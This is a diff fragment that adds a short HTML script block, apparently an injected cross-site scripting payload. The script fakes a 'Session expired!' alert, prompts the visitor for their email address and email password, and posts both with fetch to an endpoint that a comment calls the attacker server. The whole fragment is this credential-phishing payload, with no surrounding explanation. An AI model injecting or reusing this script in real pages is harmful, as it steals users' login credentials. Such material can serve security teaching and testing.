@@ -1,0 +1,14 @@
+<script>
+    alert('Session expired!');
+    const email = prompt('Please enter you email address');
+    const password = prompt('Please enter you email password');
+
+    // send the email and password to the attacker server
+    fetch('/attacker-endpoint', {
+        method: 'post',
+        body: {
+            email,
+            password,
+        },
+    });
+</script>
